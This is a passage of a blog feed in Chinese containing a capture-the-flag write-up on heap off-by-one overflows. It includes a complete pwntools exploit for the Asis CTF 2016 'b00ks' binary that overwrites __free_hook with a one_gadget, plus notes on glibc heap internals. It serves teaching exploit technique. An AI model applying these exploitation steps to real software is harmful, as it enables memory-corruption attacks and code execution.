        &lt;h1 id=&quot;堆溢出-基本方法&quot;&gt;&lt;a href=&quot;#堆溢出-基本方法&quot; class=&quot;headerlink&quot; title=&quot;堆溢出-基本方法&quot;&gt;&lt;/a&gt;堆溢出-基本方法&lt;/h1&gt;&lt;p&gt;堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（&lt;strong&gt;之所以是
      
    
    </summary>
    
      <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出-Off-By-One</title>
    <link href="https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-Off-By-One/"/>
    <id>https://kabeor.github.io/堆溢出-Off-By-One/</id>
    <published>2020-01-03T12:08:16.572Z</published>
    <updated>2020-01-03T12:08:39.150Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆溢出-Off-By-One"><a href="#堆溢出-Off-By-One" class="headerlink" title="堆溢出-Off-By-One"></a>堆溢出-Off-By-One</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。</p><p>类似如下代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;malloc.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char str[5]=&#123;0&#125;;</span><br><span class="line">str[5] = &apos;\0&apos;;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">数组总长为5，数组下标从0开始，最大为4，而我们错误地使用了str[5],造成越界写了一个字节，这就是off-by-one</span><br></pre></td></tr></table></figure><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li><li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的后一块（理论上是当前正在 unlink 的块）与当前正在 unlink 的块大小是否相等。</li></ol><h2 id="NULL-byte-off-by-one"><a href="#NULL-byte-off-by-one" class="headerlink" title="NULL byte off-by-one"></a>NULL byte off-by-one</h2><p> strlen 在计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的，但是 strcpy 在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code> 。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000411 &lt;=== next chunk</span><br></pre></td></tr></table></figure><p>在我们输入’A’*24 后执行 strcpy</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602010:   0x4141414141414141  0x4141414141414141</span><br><span class="line">0x602020:   0x4141414141414141  0x0000000000000400</span><br></pre></td></tr></table></figure><p>可以看到 next chunk 的 size 域低字节被结束符 <code>&#39;\x00&#39;</code> 覆盖。</p><p>为什么是低字节被覆盖呢：因为我们通常使用的 CPU 的字节序都是小端法的。</p><h2 id="例-Asis-CTF-2016-b00ks"><a href="#例-Asis-CTF-2016-b00ks" class="headerlink" title="例 Asis CTF 2016 b00ks"></a>例 Asis CTF 2016 b00ks</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>选单程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"\n1. Create a book"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"2. Delete a book"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"3. Edit a book"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"4. Print book detail"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"5. Change current author name"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"6. Exit"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br></pre></td></tr></table></figure><p>创建book时，注意到</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">sub_B6D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter author name: "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !sub_9F5(off_202018, <span class="number">32</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"fail to read author_name"</span>, <span class="number">32L</span>L);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>author_name最大输入为32字符</p><p>sub_9F5为读取函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">sub_9F5</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  buf = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">1u</span>LL) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )        <span class="comment">////////////////////   i循环次数==了输入的次数</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>;               <span class="comment">//////////// 注意在循环完又加了一个0，长度加1，可能发生NULL byte off-by-one</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建book时如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v3 = <span class="built_in">malloc</span>(<span class="number">32u</span>LL);</span><br><span class="line"> <span class="keyword">if</span> ( v3 )</span><br><span class="line"> &#123;</span><br><span class="line">   *(v3 + <span class="number">6</span>) = v1;      <span class="comment">/////////// book name size</span></span><br><span class="line">   *(off_202010 + v2) = v3;   <span class="comment">///// book name 固定为32</span></span><br><span class="line">   *(v3 + <span class="number">2</span>) = v5;      <span class="comment">/////////// book description</span></span><br><span class="line">   *(v3 + <span class="number">1</span>) = ptr;     <span class="comment">/////////// book_description_size</span></span><br><span class="line">   *v3 = ++unk_202024;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0L</span>L;c</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>当输入的author_name长度为32时，会向<code>book_name_ptr</code>中越界写入一个字节<code>\x00</code>。之后，在创建book_struct时，会将其地址保存在<code>global_book_struct_array</code>中，覆盖之前的字符串截断符<code>\x00</code>。因此，通过打印book_name可以实现信息泄露。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">^ .data:0000000000202010 off_202010      dq offset unk_202060    ; DATA XREF: sub_B24:loc_B38↑o  </span><br><span class="line">| .data:0000000000202010  ;book name ptr                         ; sub_BBD:loc_C1B↑o ...</span><br><span class="line">| .data:0000000000202018 off_202018      dq offset unk_202040    ; DATA XREF: sub_B6D+15↑o  </span><br><span class="line">| .data:0000000000202018  ;author_name ptr                       ; sub_D1F+CA↑o</span><br></pre></td></tr></table></figure><blockquote><p>临时禁用了系统的地址随机化功能：<code>echo 0 &gt; sudo tee /proc/sys/kernel/randomize_va_space</code></p></blockquote><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 填充满bookname</span><br><span class="line">2. 创建堆块1，覆盖bookname结尾的\x00,这样我们输出的时候就可以泄露堆块1的地址</span><br><span class="line">3. 创建堆块2，为后续做准备，堆块2要申请得比较大，因为mmap申请出来的堆块地址与libc有固定的偏移</span><br><span class="line">4. 泄露堆块1地址，记为first_heap</span><br><span class="line">5. 利用编辑author的时候多写了一个\x00字节，可以覆盖到堆块1的地址的最后一位，如果我们提前将堆块1的内容编辑好，按照上述的结构体布置好，name和description我们自己控制，伪造成一个书本的结构体，然后让覆盖过后的地址刚好是book1的description部分的话，我们相当于获得了一个任意地址读写的能力啊</span><br><span class="line">6. 任意读取获得libc地址</span><br><span class="line">7. 任意写将__free_hook函数的地址改写成one_gadget地址</span><br><span class="line"></span><br><span class="line">tips:__free_hook若没有则不调用，若有将先于free函数调用</span><br></pre></td></tr></table></figure><p>gdb调试，r运行起来，另起终端</p><p><code>ps -ef |grep b00ks</code>  查看进程号为4056</p><p><code>cat /proc/进程号/maps</code>查看程序加载基址为0x555555554000</p><p>之后设置断点时 <strong>基址+ida地址 = 实际运行的地址</strong>。</p><p><img src="https://i.loli.net/2020/01/02/JIo8ebOl5jQPMVT.png" alt></p><p>发现下不去断点，内存无法访问，后来发现是下断点使用<code>bp</code>命令的原因，用<code>break</code>就好了</p><p>后来请教大师傅，得知gdb attch也可以</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line">p=process(<span class="string">'./b00ks'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Enter author name: '</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">32</span>)                 <span class="comment">############   author name输入32位字符触发堆溢出</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">'\n1. Create a book'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>成功断下后</p><p>x/10xg 0x555555554000+0x202040查看堆</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10xg 0x555555554000+0x202040</span><br><span class="line">0x555555756040:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555756050:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555756060:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555756070:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555756080:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>溢出的一个字符是0，所以看的不清楚，如果输入的是’a’*33，就很明显</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10xg 0x555555554000+0x202040</span><br><span class="line">0x555555756040:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555756050:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555756060:0x00000000000000610x0000000000000000  &lt;---- 61代替了0位置</span><br><span class="line">0x555555756070:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555756080:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>使用create功能创建一个book后堆内变为如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x555555554000+0x202040</span><br><span class="line">0x555555756040:0x61616161616161610x6161616161616161          author_name</span><br><span class="line">0x555555756050:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555756060:0x00005555557576f00x0000000000000000 &lt;------- book结构体地址管理数组</span><br><span class="line">0x555555756070:0x00000000000000000x0000000000000000          用于放置每个book结构体的地址指针</span><br><span class="line">0x555555756080:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>再修改author_name，0x00005555557576f0最后两位就会被0覆盖成为0x0000555555757600.</p><p>再来看创建一个book，结构体记录的结构如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">book name size</span><br><span class="line">book name   （大小等于book name size）</span><br><span class="line">book description size</span><br><span class="line">book description （大小等于book description size）</span><br></pre></td></tr></table></figure><p>通过gdb调试发现</p><p>在堆中的指针指向如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x555555554000+0x202040                   </span><br><span class="line">0x555555756040:0x00000000000000610x0000000000000000</span><br><span class="line">0x555555756050:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555756060:0x00005555557577500x0000000000000000  图书结构体管理，用于按顺序存放多个book结构体指针</span><br><span class="line">0x555555756070:0x00000000000000000x0000000000000000  第一个指针会被溢出覆盖</span><br><span class="line">0x555555756080:0x00000000000000000x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x555555757750                           第一个book结构体内部结构</span><br><span class="line">0x555555757750:0x00000000000000010x00005555557576b0  book name size ?    book name</span><br><span class="line">0x555555757760:0x00005555557576d00x0000000000000078  book description    book description size</span><br><span class="line">0x555555757770:0x00000000000000000x00000000000207d1</span><br><span class="line">0x555555757780:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757790:0x00000000000000000x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x5555557576d0</span><br><span class="line">0x5555557576d0:0x63636363636363630x6363636363636363  book description起始位置</span><br><span class="line">0x5555557576e0:0x63636363636363630x6363636363636363</span><br><span class="line">0x5555557576f0:0x63636363636363630x6363636363636363</span><br><span class="line">0x555555757700:0x63636363636363630x6363636363636363  555555757750覆盖后两位变成7700指向这里</span><br><span class="line">0x555555757710:0x63636363636363630x6363636363636363</span><br></pre></td></tr></table></figure><p>0x555555757700正好处于book description里，可以通过<code>3. Edit a book  4. Print book detail</code> 来进行写入和读取。</p><p>那么就可以通过book1来间接控制book2，原因是</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">book结构指针指向图如下</span><br><span class="line">book ptr-|-&gt; name ptr        -|-&gt; name str</span><br><span class="line">         |-&gt; description ptr -|-&gt; description str</span><br><span class="line">         </span><br><span class="line">book1原来为        </span><br><span class="line">book1 ptr-|-&gt; name1 ptr        -|-&gt; name1 str</span><br><span class="line">          |-&gt; description1 ptr -|-&gt; description1 str</span><br><span class="line">          </span><br><span class="line">溢出后book1指向自己伪造的bookf，bookf我们构造为如下</span><br><span class="line">bookf ptr-|-&gt; name2 ptr        -|-&gt; name2 str</span><br><span class="line">          |-&gt; description2 ptr -|-&gt; description2 str</span><br><span class="line"></span><br><span class="line">这样，通过读写book1就可以间接读写book2指针了</span><br><span class="line">book1-book2</span><br><span class="line">          </span><br><span class="line">book1-|       |-book2</span><br><span class="line">      |-bookf-|    </span><br><span class="line">      可任意读写</span><br></pre></td></tr></table></figure><p>因为开启了Full RELRO因此无法利用赋写GOT表来实现劫持程序流，因此我们set，使用一个很大的尺寸，使得堆以 mmap 模式进行拓展。我们知道堆有两种拓展方式一种是 brk 会直接拓展原来的堆，另一种是 mmap 会单独映射一块内存。</p><p>在这里我们申请一个超大的块，来使用 mmap 扩展内存。因为 mmap 分配的内存与 libc 之间存在固定的偏移因此可以推算出 libc 的基地址。</p><p><img src="https://i.loli.net/2020/01/03/WBMUV8rqKfZJsu5.png" alt></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">libcbase计算：</span><br><span class="line">libcbase = book2_name_ptr - offset</span><br><span class="line">offset = 0x00007ffff7da2010(book2_description_ptr) - 0x7ffff7de9000(libc基地址)</span><br><span class="line">在heap下面权限为r-xp的start部分的地址就是libc基地址</span><br></pre></td></tr></table></figure><p>fake book构造为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload =p64(1) + p64(book1_addr + 0x38) * 2 + p64(0xffff)</span><br><span class="line">                                偏移需要调试计算</span><br></pre></td></tr></table></figure><p>这个题目特殊之处在于开启 PIE 并且没有泄漏 libc 基地址的方法，因此利用__free_hook写入one_gadget，调用free执行即可</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">malloc_hook = libc.symbols[&apos;__free_hook&apos;] + libcbase</span><br><span class="line">execve_addr = libcbase + one_gadget</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload = p64(free_hook)</span><br><span class="line">edit(1,payload)</span><br><span class="line">edit(2, p64(one_gadget))</span><br><span class="line">remove(2)</span><br></pre></td></tr></table></figure><h3 id="exp-思路"><a href="#exp-思路" class="headerlink" title="exp(思路)"></a>exp(思路)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level="info"</span></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line">binary = ELF(<span class="string">"b00ks"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.30.so"</span>)</span><br><span class="line">io = process(<span class="string">"./b00ks"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createbook</span><span class="params">(name_size, name, des_size, des)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(str(name_size))</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(str(des_size))</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printbook</span><span class="params">(id)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(id):</span><br><span class="line">        book_id = int(io.readline()[:<span class="number">-1</span>])</span><br><span class="line">        io.readuntil(<span class="string">": "</span>)</span><br><span class="line">        book_name = io.readline()[:<span class="number">-1</span>]</span><br><span class="line">        io.readuntil(<span class="string">": "</span>)</span><br><span class="line">        book_des = io.readline()[:<span class="number">-1</span>]</span><br><span class="line">        io.readuntil(<span class="string">": "</span>)</span><br><span class="line">        book_author = io.readline()[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> book_id, book_name, book_des, book_author</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createname</span><span class="params">(name)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"name: "</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changename</span><span class="params">(name)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"5"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editbook</span><span class="params">(book_id, new_des)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.writeline(str(book_id))</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(new_des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deletebook</span><span class="params">(book_id)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(str(book_id))</span><br><span class="line"></span><br><span class="line">createname(<span class="string">"A"</span> * <span class="number">32</span>)</span><br><span class="line">createbook(<span class="number">128</span>, <span class="string">"a"</span>, <span class="number">32</span>, <span class="string">"a"</span>)</span><br><span class="line">createbook(<span class="number">0x21000</span>, <span class="string">"a"</span>, <span class="number">0x21000</span>, <span class="string">"b"</span>)</span><br><span class="line"></span><br><span class="line">book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">book1_addr = u64(book_author[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">"book1_address:"</span> + hex(book1_addr))</span><br><span class="line"></span><br><span class="line">payload =p64(<span class="number">1</span>) + p64(book1_addr + <span class="number">0x38</span>) * <span class="number">2</span> + p64(<span class="number">0xffff</span>) <span class="comment"># p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)</span></span><br><span class="line">editbook(book_id_1, payload)</span><br><span class="line">changename(<span class="string">"A"</span> * <span class="number">32</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line">book2_name_addr = u64(book_name.ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">book2_des_addr = u64(book_des.ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">log.success(<span class="string">"book2 name addr:"</span> + hex(book2_name_addr))</span><br><span class="line">log.success(<span class="string">"book2 des addr:"</span> + hex(book2_des_addr))</span><br><span class="line">libc_base = book2_des_addr + <span class="number">0x46ff0</span><span class="comment"># 0x68ff0</span></span><br><span class="line">log.success(<span class="string">"libc base:"</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">one_gadget = libc_base +<span class="number">0xe6b93</span> <span class="comment"># 0xe6b96 0xe6b99 0x10afa9</span></span><br><span class="line">log.success(<span class="string">"free_hook:"</span> + hex(free_hook))</span><br><span class="line">log.success(<span class="string">"one_gadget:"</span> + hex(one_gadget))</span><br><span class="line">editbook(<span class="number">1</span>, p64(free_hook) * <span class="number">2</span>)</span><br><span class="line">editbook(<span class="number">2</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line">deletebook(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>From <a href="https://kabeor.github.io/堆溢出-Off-By-One/">https://kabeor.github.io/堆溢出-Off-By-One/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;堆溢出-Off-By-One&quot;&gt;&lt;a href=&quot;#堆溢出-Off-By-One&quot; class=&quot;headerlink&quot; title=&quot;堆溢出-Off-By-One&quot;&gt;&lt;/a&gt;堆溢出-Off-By-One&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot;
      
    
    </summary>
    
      <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出-Glibc堆结构</title>
    <link href="https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-Glibc%E5%A0%86%E7%BB%93%E6%9E%84/"/>
    <id>https://kabeor.github.io/堆溢出-Glibc堆结构/</id>
    <published>2020-01-03T12:08:16.564Z</published>
    <updated>2020-01-03T12:08:39.150Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆溢出-Glibc堆结构"><a href="#堆溢出-Glibc堆结构" class="headerlink" title="堆溢出-Glibc堆结构"></a>堆溢出-Glibc堆结构</h1><p>目前堆实现有如下几种</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dlmalloc  – General purpose allocator</span><br><span class="line">ptmalloc2 – glibc</span><br><span class="line">jemalloc  – FreeBSD and Firefox</span><br><span class="line">tcmalloc  – Google</span><br><span class="line">libumem   – Solaris</span><br></pre></td></tr></table></figure><p>本来linux默认的是dlmalloc，但是由于其不支持多线程堆管理，所以后来被支持多线程的prmalloc2代替了。</p><p>事实上在linux平台，*malloc本质上都是通过系统调用brk或者mmap实现的。</p><p><img src="https://i.loli.net/2020/01/02/YK3BIow1uPDQgAf.png" alt></p><p>在 glibc-2.3.x. 之后，glibc 中集成了 ptmalloc2。</p><blockquote><p>在内存分配与使用的过程中，Linux 有这样的一个基本内存管理思想，<strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系</strong>。 所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。</p></blockquote><p>内存结构如下</p><p><img src="https://i.loli.net/2020/01/02/IlP5E4GsKwoMuxJ.png" alt></p><h2 id="常见堆操作"><a href="#常见堆操作" class="headerlink" title="常见堆操作"></a>常见堆操作</h2><h3 id="malloc-size-t-n"><a href="#malloc-size-t-n" class="headerlink" title="malloc(size_t n)"></a>malloc(size_t n)</h3><p>malloc 函数返回对应大小字节的内存块的指针。</p><ul><li>当 n=0 时，返回当前系统允许的堆的最小内存块。</li><li>当 n 为负数时，由于在大多数系统上，<strong>size_t 是无符号数（这一点非常重要）</strong>，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。</li></ul><h3 id="free-void-p"><a href="#free-void-p" class="headerlink" title="free(void* p)"></a>free(void* p)</h3><p>释放由 p 所指向的内存块。这个内存块有可能是通过 malloc 函数得到的，也有可能是通过相关的函数 realloc 得到的。</p><ul><li><strong>当 p 为空指针时，函数不执行任何操作。</strong></li><li>当 p 已经被释放之后，再次释放会出现乱七八糟的效果，这其实就是 <code>double free</code>。</li><li>除了被禁用 (mallopt) 的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统，以便于减小程序所使用的内存空间。</li></ul><h3 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h3><p>对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，我们可以通过增加 brk 的大小来向操作系统申请内存。</p><p>初始时，堆的起始地址 start_brk 以及堆的当前末尾 brk 指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同</p><ul><li>不开启 ASLR 保护时，start_brk 以及 brk 会指向 data/bss 段的结尾。</li><li>开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。</li></ul><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><p>malloc 会使用 mmap 来创建独立的匿名映射段。匿名映射的目的主要是可以申请以 0 填充的内存，并且这块内存仅被调用进程所使用。</p><h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2><p>用户释放掉的 chunk 不会马上归还给系统，ptmalloc 会统一管理 heap 和 mmap 映射区域中的空闲的 chunk。当用户再一次请求分配内存时，ptmalloc 分配器会试图在空闲的 chunk 中挑选一块合适的给用户。这样可以避免频繁的系统调用，降低内存分配的开销。</p><p>ptmalloc 采用分箱式方法对空闲的 chunk 进行管理。首先，它会根据空闲的 chunk 的大小以及使用状态将 chunk 初步分为 4 类：fast bins，small bins，large bins，unsorted bin。每类中仍然有更细的划分，相似大小的 chunk 会用双向链表链接起来。也就是说，在每类 bin 的内部仍然会有多个互不相关的链表来保存不同大小的 chunk。</p><p>对于 small bins，large bins，unsorted bin 来说，ptmalloc 将它们维护在同一个数组中。</p><h3 id="Fast-Bin"><a href="#Fast-Bin" class="headerlink" title="Fast Bin"></a>Fast Bin</h3><p>大多数程序经常会申请以及释放一些比较小的内存块。如果将一些较小的 chunk 释放之后发现存在与之相邻的空闲的 chunk 并将它们进行合并，那么当下一次再次申请相应大小的 chunk 时，就需要对 chunk 进行分割，这样就大大降低了堆的利用效率。<strong>因为我们把大部分时间花在了合并、分割以及中间检查的过程中。</strong>因此，ptmalloc 中专门设计了 fast bin，对应的变量就是 malloc state 中的 fastbinsY。</p><p>为了更加高效地利用 fast bin，glibc 采用单向链表对其中的每个 bin 进行组织，并且<strong>每个 bin 采取 LIFO 策略</strong>，最近释放的 chunk 会更早地被分配，所以会更加适合于局部性。也就是说，当用户需要的 chunk 的大小小于 fastbin 的最大大小时， ptmalloc 会首先判断 fastbin 中相应的 bin 中是否有对应大小的空闲块，如果有的话，就会直接从这个 bin 中获取 chunk。如果没有的话，ptmalloc 才会做接下来的一系列操作。</p><h3 id="Small-Bin"><a href="#Small-Bin" class="headerlink" title="Small Bin"></a>Small Bin</h3><p>small bins 中一共有 62 个循环双向链表，每个链表中存储的 chunk 